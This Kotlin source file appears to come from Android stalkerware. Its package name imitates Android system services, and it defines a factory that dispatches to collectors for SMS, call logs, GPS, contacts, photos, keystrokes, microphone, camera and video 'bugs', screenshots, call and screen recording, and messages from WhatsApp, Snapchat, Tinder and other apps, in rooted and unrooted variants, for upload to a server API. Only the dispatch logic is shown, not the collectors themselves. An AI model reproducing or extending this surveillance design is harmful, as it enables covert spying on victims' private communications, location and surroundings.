package com.android.services.logs

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.collectors.*
import com.android.services.logs.collectors.auth.*
import com.android.services.logs.collectors.im.*
import com.android.services.logs.collectors.im.unrooted.*
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.api.*
import com.android.services.util.AppConstants
import kotlinx.coroutines.CoroutineScope

class LogFactory(
    private val context: Context,
    private val logType: String,
    private val localDatabaseSource: LocalDatabaseSource,
    private val coroutineScope: CoroutineScope? = null
) {

    var tosApi: TOSApi? = null
    var view360ServerApi: View360Api? = null

    constructor(
        context: Context,
        logType: String,
        localDatabaseSource: LocalDatabaseSource,
        tosApi: TOSApi? = null,
        view360ServerApi: View360Api? = null,
        coroutineScope: CoroutineScope? = null
    ) : this(context, logType, localDatabaseSource, coroutineScope) {
        this.tosApi = tosApi
        this.view360ServerApi = view360ServerApi
    }

    @Throws(Exception::class)
    fun getLog(): LogsCollector {
        when (logType) {
            AppConstants.FCM_TOKEN_TYPE -> {
                return FcmTokenCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.ACTIVE_FCM_TOKEN_TYPE -> {
                return ActiveFcmTokenCollector(context,localDatabaseSource, tosApi!!)
            }
            AppConstants.SERVER_AUTH -> {
                return ServerAuthCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.PUSH_NOTIFICATIONS_TYPE -> {
                return PushNotificationsCollector(context, localDatabaseSource, tosApi!!, coroutineScope!!)
            }
            AppConstants.DEVICE_INFO_TYPE -> {
                return DeviceInfoCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.SYNC_SETTING_TYPE->{
                return SyncSettingCollector(context,localDatabaseSource,tosApi!!)
            }
            AppConstants.SMS_LOG_TYPE -> {
                return SmsLogCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.CALL_LOG_TYPE -> {
                return CallLogCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.GPS_LOCATION_TYPE -> {
                return GpsLocationCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.CONTACTS_TYPE -> {
                return ContactsCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.APPOINTMENT_TYPE -> {
                return AppointmentCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.PHOTOS_TYPE -> {
                return PhotosCollector(context, localDatabaseSource)
            }
            AppConstants.KEY_LOG_TYPE -> {
                return KeyLogCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.BROWSER_HISTORY_TYPE -> {
                return BrowserHistoryCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.INSTALLED_APP_TYPE -> {
                return InstalledAppCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.CONNECTED_NETWORK_TYPE -> {
                return ConnectedNetworkCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.PUSH_STATUS_TYPE -> {
                return FcmPushStatusCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.MIC_BUG_TYPE -> {
                return MicBugCollector(context, localDatabaseSource)
            }
            AppConstants.VIDEO_BUG_TYPE -> {
                return VideoBugCollector(context, localDatabaseSource)
            }
            AppConstants.CAMERA_BUG_TYPE -> {
                return CameraBugCollector(context, localDatabaseSource)
            }
            AppConstants.SCREEN_SHOT_TYPE -> {
                return ScreenShotCollector(context, localDatabaseSource)
            }
            AppConstants.SNAP_CHAT_EVENTS_TYPE -> {
                return SnapChatEventCollector(context, localDatabaseSource)
            }
            AppConstants.SCREEN_TIME_TYPE -> {
                return ScreenTimeCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.CALL_RECORD_TYPE -> {
                return CallRecordCollector(context, localDatabaseSource)
            }
            AppConstants.SCREEN_RECORDING_TYPE -> {
                return ScreenRecordingCollector(context, localDatabaseSource)
            }
            AppConstants.VOIP_CALL_TYPE -> {
                return VoipCallCollector(context, localDatabaseSource)
            }
            AppConstants.SKYPE_ROOTED_TYPE -> {
                return SkypeRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.WHATS_APP_ROOTED_TYPE -> {
                return WhatsAppRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.VIBER_ROOTED_TYPE -> {
                return ViberRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.LINE_ROOTED_TYPE -> {
                return LineRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.IMO_ROOTED_TYPE -> {
                return ImoRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.FACEBOOK_ROOTED_TYPE -> {
                return FacebookRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE -> {
                return InstagramMessageCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.INSTAGRAM_POST_ROOTED_TYPE -> {
                return InstagramPostCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.HIKE_ROOTED_TYPE -> {
                return HikeRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.HANGOUT_ROOTED_TYPE -> {
                return HangoutRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.TINDER_ROOTED_TYPE -> {
                return TinderRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.TUMBLR_ROOTED_TYPE -> {
                return TumblrRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.ZALO_ROOTED_TYPE -> {
                return ZaloRootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.WHATS_APP_UNROOTED_TYPE -> {
                return WhatsAppUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.FACEBOOK_UNROOTED_TYPE -> {
                return FacebookUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.SKYPE_UNROOTED_TYPE -> {
                return SkypeUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.LINE_UNROOTED_TYPE -> {
                return LineUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.VIBER_UNROOTED_TYPE -> {
                return ViberUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.IMO_UNROOTED_TYPE -> {
                return ImoUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.INSTAGRAM_UNROOTED_TYPE -> {
                return InstagramUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.TINDER_UNROOTED_TYPE -> {
                return TinderUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.TUMBLR_UNROOTED_TYPE -> {
                return TumblrUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
//            AppConstants.HIKE_UNROOTED_TYPE -> {
//                return HikeUnrootedCollector(context, localDatabaseSource, tosApi!!)
//            }
            AppConstants.SNAP_CHAT_UNROOTED_TYPE -> {
                return SnapChatUnrootedCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.VOICE_MESSAGE_TYPE -> {
                return VoiceMessageCollector(context, localDatabaseSource)
            }
            AppConstants.GEO_FENCES_EVENTS_TYPE -> {
                return GeoFenceEventsCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.VIEW_360_TYPE -> {
                return View360UserActivation(context, localDatabaseSource, view360ServerApi!!)
            }
            AppConstants.TEXT_ALERT_TYPE -> {
                return TextAlertEventCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.APP_NOTIFICATIONS_TYPE -> {
                return AppNotificationsCollector(context, localDatabaseSource, tosApi!!)
            }
            AppConstants.APPS_PERMISSION_TYPE -> {
                return AppPermissionsCollector(context, localDatabaseSource, tosApi!!)
            }
            else -> {

            }
        }
        throw IllegalArgumentException("Can't handle your command $logType")
    }
}